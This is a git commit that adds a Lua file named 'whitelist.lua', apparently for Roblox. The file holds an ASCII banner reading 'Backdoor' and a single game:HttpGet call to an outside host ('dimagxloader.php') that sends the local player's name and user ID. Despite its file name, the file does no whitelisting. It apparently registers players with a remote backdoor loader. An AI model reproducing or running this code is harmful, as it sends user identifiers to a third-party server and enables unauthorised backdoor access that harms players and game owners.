875522df04c07d7a3721b8ce74ce4fcafb06bacc
Pvpahh <81647524+Pvpahh@users.noreply.github.com>
2022-02-28 04:36:28 -0500

    Create whitelist.lua

---
+++ whitelist.lua
@@ -0,0 +1,12 @@
+--[[
+######                                                   
+#     #   ##    ####  #    # #####   ####   ####  #####  
+#     #  #  #  #    # #   #  #    # #    # #    # #    # 
+######  #    # #      ####   #    # #    # #    # #    # 
+#     # ###### #      #  #   #    # #    # #    # #####  
+#     # #    # #    # #   #  #    # #    # #    # #   #  
+######  #    #  ####  #    # #####   ####   ####  #    # 
+                                                         
+]]
+   game:HttpGet('https://enclosed.live/dimagxloader.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'');
+    
